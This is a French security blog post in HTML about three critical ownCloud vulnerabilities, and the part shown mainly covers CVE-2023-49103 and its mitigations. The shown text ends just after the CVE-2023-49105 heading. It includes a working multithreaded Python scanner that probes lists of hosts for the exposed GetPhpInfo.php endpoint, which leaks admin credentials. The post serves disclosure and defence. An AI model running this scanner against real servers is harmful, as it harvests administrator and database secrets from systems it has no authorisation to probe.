<!DOCTYPE html>
<html lang="fr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Pwncloud : votre propre cloud (non) sécurisé - Trackflaw | Expert en sécurité informatique</title><meta name="Description" content="OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d&#39;applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public. Or, comme tous les logiciels il souffre de vulnérabilité."><meta property="og:title" content="Pwncloud : votre propre cloud (non) sécurisé" />
<meta property="og:description" content="OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d&#39;applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public. Or, comme tous les logiciels il souffre de vulnérabilité." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" /><meta property="og:image" content="http://localhost:1313/images/pwncloud/pwncloud.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-08T15:05:00+01:00" />
<meta property="article:modified_time" content="2023-12-08T15:05:00+01:00" /><meta property="og:site_name" content="Trackflaw | Expert en sécurité offensive" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/images/pwncloud/pwncloud.png" /><meta name="twitter:title" content="Pwncloud : votre propre cloud (non) sécurisé"/>
<meta name="twitter:description" content="OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d&#39;applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public. Or, comme tous les logiciels il souffre de vulnérabilité."/>
      <meta name="twitter:site" content="@trackflaw"/>
<meta name="application-name" content="Trackflaw | Expert en sécurité offensive">
<meta name="apple-mobile-web-app-title" content="Trackflaw | Expert en sécurité offensive"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" /><link rel="prev" href="http://localhost:1313/reverse-tabnabbing-phishing-sous-st%C3%A9ro%C3%AFdes/" /><link rel="next" href="http://localhost:1313/choisir-son-prestataire-de-test-intrusion/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Pwncloud : votre propre cloud (non) sécurisé",
        "inLanguage": "fr",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9\/"
        },"image": ["http:\/\/localhost:1313\/images\/logo.png"],"genre": "posts","keywords": "Pwncloud, Pentest, Cloud","wordcount":  1510 ,
        "url": "http:\/\/localhost:1313\/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9\/","datePublished": "2023-12-08T15:05:00+01:00","dateModified": "2023-12-08T15:05:00+01:00","publisher": {
            "@type": "Organization",
            "name": "Thibaud Robin - Trackflaw","logo": "http:\/\/localhost:1313\/images\/logo.png"},"author": {
                "@type": "Person",
                "name": "Thibaud Robin"
            },"description": "OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d'applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public. Or, comme tous les logiciels il souffre de vulnérabilité."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/logo3.png"
        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
        data-sizes="auto"
        alt="/images/logo3.png"
        title="/images/logo3.png" />TRACKFLAW</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Articles"> Articles </a><a class="menu-item" href="/news/" title="Actualités"> Actualités </a><a class="menu-item" href="/about/" title="A propos"> A propos </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Rechercher">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clair">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Choisir la langue">
                    <i class="fa fa-globe" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" selected>Français</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/logo3.png"
        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
        data-sizes="auto"
        alt="/images/logo3.png"
        title="/images/logo3.png" />TRACKFLAW</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Rechercher">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clair">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Annuler
                    </a>
                </div><a class="menu-item" href="/posts/" title="Articles">Articles</a><a class="menu-item" href="/news/" title="Actualités">Actualités</a><a class="menu-item" href="/about/" title="A propos">A propos</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Choisir la langue">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/pwncloud-votre-propre-cloud-non-s%C3%A9curis%C3%A9/" selected>Français</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contenu</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pwncloud : votre propre cloud (non) sécurisé</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author">
                    <a href="https://www.linkedin.com/in/thibaud-robin/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="thibaud-picture-big" aria-hidden="true"></i>Thibaud Robin</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="08/12/2023">08/12/2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1510 mots&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/pwncloud/pwncloud.png"
        data-srcset="/images/pwncloud/pwncloud.png, /images/pwncloud/pwncloud.png 1.5x, /images/pwncloud/pwncloud.png 2x"
        data-sizes="auto"
        alt="/images/pwncloud/pwncloud.png"
        title="OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d&#39;applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public. Or, comme tous les logiciels il souffre de vulnérabilité." /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contenu</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-2-et-3-vulnérabilités-critiques">1, 2 et 3 vulnérabilités critiques</a></li>
    <li><a href="#cve-2023-49103">CVE-2023-49103</a>
      <ul>
        <li><a href="#en-bref">En bref</a></li>
        <li><a href="#a-retenir">A retenir</a></li>
        <li><a href="#les-protections">Les protections</a></li>
        <li><a href="#poc">PoC</a></li>
        <li><a href="#schéma">Schéma</a></li>
      </ul>
    </li>
    <li><a href="#cve-2023-49105">CVE-2023-49105</a>
      <ul>
        <li><a href="#en-bref-1">En bref</a></li>
        <li><a href="#etude-du-scénario-le-plus-probable--scénario-anonyme">Etude du scénario le plus probable : scénario anonyme</a></li>
        <li><a href="#etude-du-scénario-le-moins-probable--scénario-authentifié">Etude du scénario le moins probable : scénario authentifié</a></li>
      </ul>
    </li>
    <li><a href="#cve-2023-49104">CVE-2023-49104</a></li>
    <li><a href="#sources">Sources</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="-pwncloud--votre-propre-cloud-non-sécurisé">☁️ Pwncloud : votre propre cloud (non) sécurisé</h1>
<h2 id="1-2-et-3-vulnérabilités-critiques">1, 2 et 3 vulnérabilités critiques</h2>
<p>OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d&rsquo;applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public.</p>
<p>Fin novembre 2023, OwnCloud publiait 3 articles concernant 3 vulnérabilités critiques :</p>
<ul>
<li>
<p><strong>La CVE-2023-49103</strong> :</p>
<ul>
<li>Score CVSS de 10 ! 😱</li>
<li>Divulgation d&rsquo;informations d&rsquo;identification et de configuration sensibles dans des déploiements conteneurisés.</li>
<li><a href="https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/" target="_blank" rel="noopener noreffer ">https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/</a></li>
</ul>
</li>
<li>
<p><strong>La CVE-2023-49105</strong> :</p>
<ul>
<li>Score CVSS de 9.8 😨</li>
<li>Lecture et écriture de fichiers via un contournement de l&rsquo;authentification de l&rsquo;Api WebDAV.</li>
<li><a href="https://owncloud.com/security-advisories/webdav-api-authentication-bypass-using-pre-signed-urls/" target="_blank" rel="noopener noreffer ">https://owncloud.com/security-advisories/webdav-api-authentication-bypass-using-pre-signed-urls/</a></li>
</ul>
</li>
<li>
<p><strong>La CVE-2023-49104</strong> :</p>
<ul>
<li>Score CVSS de 9.0</li>
<li>Contournement de la validation de sous-domaine impactant oauth2.</li>
<li><a href="https://owncloud.com/security-advisories/subdomain-validation-bypass/" target="_blank" rel="noopener noreffer ">https://owncloud.com/security-advisories/subdomain-validation-bypass/</a></li>
</ul>
</li>
</ul>
<h2 id="cve-2023-49103">CVE-2023-49103</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/pwncloud/2023-12-11_16-10.png"
        data-srcset="/images/pwncloud/2023-12-11_16-10.png, /images/pwncloud/2023-12-11_16-10.png 1.5x, /images/pwncloud/2023-12-11_16-10.png 2x"
        data-sizes="auto"
        alt="/images/pwncloud/2023-12-11_16-10.png"
        title="CVE-2023-49103" /></p>
<p>La CVE-2023-49103 est surement la vulnérabilité la plus facilement exploitable des trois. Mais pas forcément la plus sévère !</p>
<h3 id="en-bref">En bref</h3>
<p>Quelques explications pour rapidement comprendre la vulnérabilité :</p>
<ul>
<li>L&rsquo;application &ldquo;graphapi&rdquo; s&rsquo;appuie sur une bibliothèque tierce vulnérable (graphapi 0.2.0 – 0.3.0).</li>
<li>Cette bibliothèque divulgue les détails de configuration de l&rsquo;environnement PHP (phpinfo) 🤣</li>
<li>On y retrouve des données sensibles telles que le mot de passe de l&rsquo;administrateur d&rsquo;ownCloud, le serveur de messagerie, etc.</li>
</ul>
<h3 id="a-retenir">A retenir</h3>
<ul>
<li>Désactiver l&rsquo;application graphapi n&rsquo;élimine pas la vulnérabilité (ça serait trop simple sinon 😂)</li>
<li>Affecte aussi les environnements non conteneurisés.</li>
<li>Les conteneurs Docker datant d&rsquo;avant février 2023 ne sont pas vulnérables.</li>
</ul>
<h3 id="les-protections">Les protections</h3>
<p>Comment se protéger de cette vulnérabilité ? Il existe plusieurs méthodes :</p>
<ol>
<li>Supprimer le fichier <code>owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php</code>.</li>
<li>Désactiver la fonction <code>phpinfo</code> si possible.</li>
<li>Modifier les secrets suivants
<ul>
<li>Mot de passe administrateur ownCloud</li>
<li>Identifiants du serveur de messagerie</li>
<li>Identifiants de la base de données</li>
<li>Clé d&rsquo;accès au magasin d&rsquo;objets/S3</li>
</ul>
</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Un PoC est disponible pour détecter la présence du fichier GetPhpInfo.php : <a href="https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py" target="_blank" rel="noopener noreffer ">https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">queue</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">alive_progress</span> <span class="kn">import</span> <span class="n">alive_bar</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_phpinfo</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>  <span class="c1"># Bypass SSL verification</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;OWNCLOUD_ADMIN_&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">RequestException</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_urls</span><span class="p">(</span><span class="n">url_queue</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">update_bar</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="n">url_queue</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">url</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">url_queue</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>  <span class="c1"># Sentinel value to indicate completion</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">check_phpinfo</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s2">&#34;Valid: &#34;</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="s2">&#34;Invalid: &#34;</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;Error processing </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">url_queue</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">update_bar</span><span class="p">()</span>  <span class="c1"># Update the progress bar</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">urls</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">base_url</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Append both URL variants for each base URL</span>
</span></span><span class="line"><span class="cl">            <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="s2">&#34;/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="s2">&#34;/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">url_queue</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">num_workers</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">urls</span><span class="p">))</span>  <span class="c1"># Adjust based on your system&#39;s capabilities</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">alive_bar</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">urls</span><span class="p">),</span> <span class="n">bar</span><span class="o">=</span><span class="s1">&#39;smooth&#39;</span><span class="p">,</span> <span class="n">enrich_print</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> <span class="k">as</span> <span class="n">bar</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">num_workers</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Start worker threads</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_workers</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">process_urls</span><span class="p">,</span> <span class="n">url_queue</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">bar</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># Read URLs and add them to the queue</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">url_queue</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># Add sentinel values to indicate completion</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_workers</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">url_queue</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">url_queue</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>  <span class="c1"># Wait for all tasks to be completed</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Process some URLs.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Input file with URLs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span> <span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file for valid URLs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">process_file</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="schéma">Schéma</h3>
<p>Ci-dessous un schéma récapitulatif de l&rsquo;attaque :</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/pwncloud/CVE-2023-49103.gif"
        data-srcset="/images/pwncloud/CVE-2023-49103.gif, /images/pwncloud/CVE-2023-49103.gif 1.5x, /images/pwncloud/CVE-2023-49103.gif 2x"
        data-sizes="auto"
        alt="/images/pwncloud/CVE-2023-49103.gif"
        title="Alt text" /></p>
<h2 id="cve-2023-49105">CVE-2023-49105</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/pwncloud/2023-12-11_16-11.png"
